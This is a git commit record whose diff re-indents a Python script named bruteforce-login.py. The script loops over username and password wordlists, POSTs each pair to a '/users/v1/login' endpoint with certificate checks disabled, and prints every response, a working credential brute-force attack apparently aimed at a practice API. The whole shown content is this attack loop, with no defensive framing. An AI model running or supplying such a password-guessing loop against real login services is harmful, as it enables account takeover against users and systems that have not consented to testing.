95b2e027555525aafb8f2aad7df1188445cdbbde
David Homoney <david@homoney.com>
2023-09-01 12:57:53 -0500

    whitespace bs

--- bruteforce-login.py
+++ bruteforce-login.py
@@ -9,8 +9,8 @@ LoginUserList = file2.read().splitlines()
 
 count = 0
 for username in LoginUserList:
-for password in PasswordList:
-        count += 1
-        r = requests.post(host + '/users/v1/login', json={"username": username, "password": password}, verify=False)
-        time.sleep(0.1)
-        print(username + ':' + password + ' | ' + str(r.json()))
+        for password in PasswordList:
+                count += 1
+                r = requests.post(host + '/users/v1/login', json={"username": username, "password": password}, verify=False)
+                time.sleep(0.1)
+                print(username + ':' + password + ' | ' + str(r.json()))
